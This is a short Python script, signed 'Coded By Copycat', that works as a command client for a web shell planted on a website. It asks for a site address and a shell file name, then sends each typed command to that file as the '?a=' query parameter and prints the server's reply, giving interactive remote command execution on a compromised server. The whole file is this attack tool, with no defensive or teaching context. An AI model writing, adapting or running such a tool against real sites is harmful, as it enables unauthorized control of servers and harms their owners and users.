#!usr/bin/env python3
import os
import requests

os.system("clear")

print("""
▒█▀▀█ █▀▀█ ▒█▀▀▄ ░░ ▒█▀▀▀ ▒█░░▒█ █▀▀█
▒█▄▄▀ ░░▀▄ ▒█░▒█ ▀▀ ▒█▀▀▀ ▒█▄▄▄█ ░░▀▄
▒█░▒█ █▄▄█ ▒█▄▄▀ ░░ ▒█▄▄▄ ░░▒█░░ █▄▄█""")
print("<-----------Coded By Copycat------------>")
print("")
url = input("[+] Site Name: ")
shell_name = input("[+] Shell Name: ")

while True:
    try:
        cmd_shell= "?a="
        cmd = input("$ ")
        payload = (url + "/" +shell_name + cmd_shell + cmd)

        r = requests.get(payload)
        r.raise_for_status()
        print(r.text)
        if cmd =="exit":
            exit()
    except:
        print("[!] Something Went Wrong!!")
        exit()
